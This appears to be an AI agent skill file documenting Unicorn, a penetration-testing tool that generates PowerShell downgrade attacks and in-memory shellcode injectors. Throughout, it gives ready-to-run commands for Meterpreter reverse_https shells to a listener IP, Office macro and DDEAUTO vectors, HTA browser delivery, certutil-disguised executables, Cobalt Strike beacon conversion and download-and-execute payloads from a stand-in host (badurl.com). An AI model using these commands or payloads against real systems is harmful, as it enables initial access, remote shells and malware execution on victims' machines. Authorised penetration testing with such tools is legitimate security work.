---
name: unicorn-magic
description: Generate PowerShell downgrade attacks and inject shellcode directly into memory. Use for initial access, payload delivery, and execution during penetration tests via macros, HTAs, DDE Office attacks, or certutil-based binary transfers. It supports Metasploit payloads, Cobalt Strike beacons, and custom shellcode.
---

# unicorn-magic

## Overview
Unicorn is a tool for using a PowerShell downgrade attack and injecting shellcode straight into memory. It is based on techniques presented by TrustedSec and Matthew Graeber to bypass execution restrictions. It belongs to the Web Application Testing and Exploitation domains.

## Installation (if not already installed)
Assume unicorn-magic is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install unicorn-magic
```
Note: Requires `metasploit-framework` and `python3`.

## Common Workflows

### Standard PowerShell Meterpreter Payload
Generates `powershell_attack.txt` (the command) and `unicorn.rc` (the Metasploit listener).
```bash
unicorn-magic windows/meterpreter/reverse_https 192.168.1.5 443
```

### Macro Attack for Excel/Word
Generates VBA code to be placed in an `Auto_Open` (legacy) or `AutoOpen` (Office 365) macro.
```bash
unicorn-magic windows/meterpreter/reverse_https 192.168.1.5 443 macro
```

### HTA Attack Vector
Creates an `hta_access/` folder containing `index.html` and `Launcher.hta` for browser-based delivery.
```bash
unicorn-magic windows/meterpreter/reverse_https 192.168.1.5 443 hta
```

### Cobalt Strike Beacon Integration
Imports C# formatted shellcode from Cobalt Strike and converts it to a PowerShell injection command.
```bash
unicorn-magic cobalt_strike_file.cs cs
```

## Complete Command Reference

```bash
unicorn-magic <payload> <ipaddr> <port> [vector] [options]
```

### Positional Arguments & Vectors

| Argument / Vector | Description |
|------|-------------|
| `<payload>` | Metasploit payload (e.g., `windows/meterpreter/reverse_https`) or path to a file (`.ps1`, `.cs`, `.txt`, `.exe`). |
| `<ipaddr>` | The LHOST / listener IP address. |
| `<port>` | The LPORT / listener port. |
| `macro` | Generates a VBA macro for Office documents. |
| `hta` | Generates HTML Application (HTA) files for browser delivery. |
| `ms` | Generates a `.SettingContent-ms` shortcut file for execution. |
| `dde` | Generates a DDEAUTO formula for macro-less Office execution. |
| `crt` | Uses `certutil` to encode an EXE into a fake certificate (Base64) for transfer. |
| `cs` | Flag indicating the input file is a Cobalt Strike C# (`.cs`) export. |
| `shellcode` | Flag indicating the input file is raw shellcode (formatted as `0x00` or Metasploit output). |

### Usage Examples

| Scenario | Command |
|------|-------------|
| **Standard PS** | `unicorn-magic windows/meterpreter/reverse_https 192.168.1.5 443` |
| **Download/Exec** | `unicorn-magic windows/download_exec url=http://badurl.com/payload.exe` |
| **Download/Exec Macro** | `unicorn-magic windows/download_exec url=http://badurl.com/payload.exe macro` |
| **Cobalt Strike Macro** | `unicorn-magic cobalt_strike_file.cs cs macro` |
| **Cobalt Strike HTA** | `unicorn-magic cobalt_strike_file.cs cs hta` |
| **Cobalt Strike MS** | `unicorn-magic cobalt_strike_file.cs cs ms` |
| **Custom Shellcode MS** | `unicorn-magic path_to_shellcode.txt shellcode ms` |
| **Custom Shellcode HTA** | `unicorn-magic path_to_shellcode.txt shellcode hta` |
| **Custom Shellcode Macro** | `unicorn-magic path_to_shellcode.txt shellcode macro` |
| **Certutil EXE Encode** | `unicorn-magic path_to_payload.exe crt` |
| **Custom PS1 to Cmd** | `unicorn-magic harmless.ps1` |
| **Custom PS1 to Macro** | `unicorn-magic myfile.ps1 macro` |
| **PS1 Macro (Custom Len)** | `unicorn-magic muahahaha.ps1 macro 500` |
| **SettingContent-ms Only** | `unicorn-magic ms` |

## Notes
- **Output Files**: Most attacks generate `powershell_attack.txt` (the payload) and `unicorn.rc` (Metasploit resource script for the listener).
- **Listener**: Always run `msfconsole -r unicorn.rc` to ensure your listener matches the generated payload.
- **Office 365 Macros**: For newer Word versions, change `Sub Auto_Open()` to `Sub AutoOpen()` and rename the macro accordingly.
- **DDE Attacks**: These require hosting `download.ps1` on a web server (e.g., Apache) accessible by the victim, as DDE has strict character limits.
- **Cobalt Strike**: The file must be exported in the **C# (CS)** format within Cobalt Strike to be parsed correctly.
- **CMD Limits**: Commands exceeding 8191 characters may fail in `cmd.exe` but work fine when called directly via PowerShell or WScript.Shell.